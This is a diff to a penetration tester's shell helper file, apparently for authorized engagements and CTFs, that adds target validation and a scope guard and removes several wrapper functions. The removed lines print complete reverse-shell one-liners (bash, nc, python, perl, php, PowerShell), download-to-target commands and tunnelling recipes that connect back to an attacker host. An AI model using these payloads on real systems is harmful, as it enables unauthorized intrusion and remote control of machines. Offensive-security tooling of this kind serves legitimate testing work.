@@ -3,6 +3,16 @@
 # For use on authorized engagements, CTFs, and lab work only. These are
 # convenience wrappers around standard tooling — nothing here targets anything
 # you don't point it at yourself.
+#
+# What is left here does work a command could not do for itself: scaffolds a
+# directory, picks the best available tool, holds state across commands.
+#
+# What used to be here and is not any more — revshell, tunnel, dl, crack,
+# upgrade-shell, and all of ad.sh — was recall: a name to memorise so you did
+# not have to memorise a command. That content now lives in snippets/, searched
+# with ^X^S, which puts the real command in your buffer with $LHOST/$RHOST/creds
+# filled in. You read it before it runs, and the ledger records the command
+# rather than the wrapper.
 
 # --- lhost: your attack IP (prefers VPN tun0, falls back to eth0) --------------
 # Usage: lhost            -> prints and exports $LHOST
@@ -33,11 +43,23 @@ target() {
         echo "RHOST=${RHOST:-<unset>}  name=${TARGET_NAME:-<unset>}  dir=${TARGET_DIR:-<unset>}"
         return 0
     fi
+    # Validate before creating anything. `target RHOST=10.0.0.1` used to be
+    # accepted verbatim and would happily mkdir ~/ops/RHOST=10.0.0.1.
+    case "$1" in
+        *=*|*/*|.*|"")
+            echo "target: '$1' is not an address or hostname" >&2
+            echo "usage: target <ip|hostname> [name]" >&2
+            return 1 ;;
+    esac
     export RHOST="$1"
     export TARGET_NAME="${2:-$1}"
     export TARGET_DIR="$OPS/$TARGET_NAME"
     export RT_CMDLOG="$TARGET_DIR/notes/commands.log"   # zsh preexec logs here
     mkdir -p "$TARGET_DIR"/{scans,loot,exploit,notes,www}
+    # Arm the scope guard with the box you just named. Widen it with `scope add`;
+    # until a scope file exists the guard has nothing to enforce and stays quiet.
+    [ -f "$TARGET_DIR/scope.txt" ] || printf '# scope for %s — widen with `scope add <cidr>`\n%s\n' \
+        "$TARGET_NAME" "$RHOST" > "$TARGET_DIR/scope.txt"
     [ -f "$TARGET_DIR/notes/README.md" ] || cat > "$TARGET_DIR/notes/README.md" <<EOF
 # $TARGET_NAME ($RHOST)
 
@@ -89,54 +111,6 @@ listen() {
     fi
 }
 
-# --- revshell: print common reverse-shell one-liners for the current LHOST -----
-# Usage: revshell [port] [type]
-#        type ∈ bash|python|nc|perl|php|powershell|all   (default all)
-revshell() {
-    local port="${1:-4444}" type="${2:-all}"
-    [ -n "$LHOST" ] || lhost >/dev/null
-    local ip="$LHOST"
-    _rs_bash()   { echo "bash -i >& /dev/tcp/$ip/$port 0>&1"; }
-    _rs_bash64() { local p; p=$(printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$ip" "$port" | base64 -w0); echo "bash -c '{echo,$p}|{base64,-d}|bash'"; }
-    _rs_nc()     { echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"; }
-    _rs_python() { echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"; }
-    _rs_perl()   { echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"; }
-    _rs_php()    { echo "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; }
-    _rs_ps()     { echo "powershell -nop -c \"\$c=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$sb=([text.encoding]::ASCII).GetBytes(\$r+'PS '+(pwd).Path+'> ');\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()}\""; }
-    echo "# LHOST=$ip PORT=$port"
-    case "$type" in
-        bash)       _rs_bash;;
-        bash64)     _rs_bash64;;
-        nc)         _rs_nc;;
-        python)     _rs_python;;
-        perl)       _rs_perl;;
-        php)        _rs_php;;
-        powershell|ps) _rs_ps;;
-        all)
-            printf '\n[bash]\n';        _rs_bash
-            printf '\n[bash base64]\n'; _rs_bash64
-            printf '\n[nc mkfifo]\n';   _rs_nc
-            printf '\n[python pty]\n';  _rs_python
-            printf '\n[perl]\n';        _rs_perl
-            printf '\n[php]\n';         _rs_php
-            printf '\n[powershell]\n';  _rs_ps
-            printf '\n';;
-        *) echo "unknown type: $type" >&2; return 1;;
-    esac
-}
-
-# --- upgrade-shell: print the TTY-upgrade sequence to paste into a dumb shell ---
-upgrade-shell() {
-    cat <<'EOF'
-# In the caught shell:
-python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
-# then background with Ctrl-Z, and locally:
-stty raw -echo; fg
-# back in the shell:
-export TERM=xterm-256color; stty rows 50 cols 200
-EOF
-}
-
 # --- scan: staged nmap into ./scans (fast top ports, then full on found ports) -
 # Usage: scan [ip]   (defaults to $RHOST)
 scan() {
@@ -166,60 +140,6 @@ fuzz() {
 b64()    { if [ -n "$1" ]; then printf '%s' "$1" | base64 -w0; echo; else base64 -w0; fi; }
 ub64()   { if [ -n "$1" ]; then printf '%s' "$1" | base64 -d;  echo; else base64 -d; fi; }
 urlenc() { python3 -c 'import sys,urllib.parse as u;print(u.quote(sys.argv[1] if len(sys.argv)>1 else sys.stdin.read().strip()))' "$@"; }
-
-# --- dl: build a download one-liner for the current LHOST (paste on target) -----
-# Usage: dl <file-in-cwd> [win]   -> prints wget/curl (or PowerShell) fetch cmd
-dl() {
-    [ -n "$1" ] || { echo "usage: dl <file> [win]"; return 1; }
-    [ -n "$LHOST" ] || lhost >/dev/null
-    local url="http://$LHOST:8000/$1"
-    if [ "$2" = "win" ]; then
-        echo "powershell -c \"iwr $url -OutFile C:\\Windows\\Temp\\$1\""
-        echo "certutil -urlcache -f $url $1"
-    else
-        echo "wget $url -O /tmp/$1  ||  curl -s $url -o /tmp/$1"
-    fi
-    echo "# (serve first: run \`serve\` in the dir holding $1)"
-}
-
-# --- tunnel: quick tunneling recipes (ligolo-ng / chisel) ----------------------
-# Prints the exact commands for whichever tool you have; no magic, just recall.
-tunnel() {
-    [ -n "$LHOST" ] || lhost >/dev/null
-    cat <<EOF
-# ── ligolo-ng ──────────────────────────────────────────────
-# attacker: set up the interface once
-sudo ip tuntap add user \$USER mode tun ligolo && sudo ip link set ligolo up
-./proxy -selfcert                                   # start proxy (:11601)
-# on target: connect back
-./agent -connect $LHOST:11601 -ignore-cert
-# attacker (in ligolo session): session; then add route to the pivot subnet
-sudo ip route add <SUBNET>/24 dev ligolo
-
-# ── chisel (reverse SOCKS) ─────────────────────────────────
-./chisel server -p 8080 --reverse                   # attacker
-./chisel client $LHOST:8080 R:1080:socks            # target
-# then: proxychains <tool>   (socks5 127.0.0.1 1080 in /etc/proxychains4.conf)
-EOF
-}
-
-# --- crack: pick the hashcat mode by name, run against rockyou ------------------
-# Usage: crack <hashfile> <mode>   mode ∈ ntlm|asrep|kerb|net-ntlmv2|sha512crypt
-crack() {
-    local f="$1" name="$2"
-    [ -n "$f" ] && [ -n "$name" ] || { echo "usage: crack <hashfile> <ntlm|asrep|kerb|net-ntlmv2|sha512crypt>"; return 1; }
-    local m
-    case "$name" in
-        ntlm)         m=1000;;
-        asrep)        m=18200;;
-        kerb)         m=13100;;
-        net-ntlmv2)   m=5600;;
-        sha512crypt)  m=1800;;
-        *) echo "unknown: $name"; return 1;;
-    esac
-    local wl="$WORDLISTS/rockyou.txt"; [ -f "$wl" ] || wl="$WORDLISTS/rockyou.txt.gz"
-    hashcat -m "$m" "$f" "$wl"
-}
 
 # --- mythic: drive mythic-cli from anywhere ------------------------------------
 # Usage: mythic <start|stop|status|...>   (wraps sudo ./mythic-cli in $MYTHIC_DIR)
